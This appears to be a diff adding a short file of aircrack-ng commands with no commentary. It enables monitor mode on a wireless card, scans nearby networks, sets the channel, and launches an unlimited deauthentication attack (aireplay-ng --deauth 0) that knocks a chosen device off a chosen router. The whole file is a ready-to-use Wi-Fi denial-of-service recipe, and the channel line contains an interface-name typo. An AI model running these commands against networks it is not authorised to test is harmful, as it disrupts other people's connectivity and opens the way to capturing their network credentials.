@@ -1,0 +1,6 @@
+airmon-ng start wlan0
+airodump-ng wlan0
+sudo iwconfig wlano channel <channel no>
+
+
+aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0
